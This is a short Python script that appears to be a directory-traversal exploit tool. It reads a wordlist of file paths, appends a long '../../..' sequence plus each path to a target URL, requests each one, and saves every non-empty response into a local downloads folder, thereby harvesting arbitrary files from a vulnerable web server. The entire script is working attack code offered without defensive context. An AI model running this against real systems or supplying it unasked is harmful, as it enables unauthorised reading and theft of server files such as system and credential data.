#
#

import requests
import sys
import os
try:
    url=sys.argv[1]
except:
    sys.exit()
try:
    dictionary=sys.argv[2]
except:
    sys.exit()
downloads_dir='downloads'
if not os.path.exists(downloads_dir):
    os.mkdir(downloads_dir)
with open(dictionary) as fp:
    line = fp.readline()
    while line:
        r=requests.get(url+'../../../../../../..{}'.format(line.strip()))
        response=r.text
        if(len(r.content)>0):
            files="{}.txt".format(line.strip().replace("/","_"))
            with open(os.path.join(downloads_dir,files), "w") as f:
                f.write(r.text)
        line=fp.readline()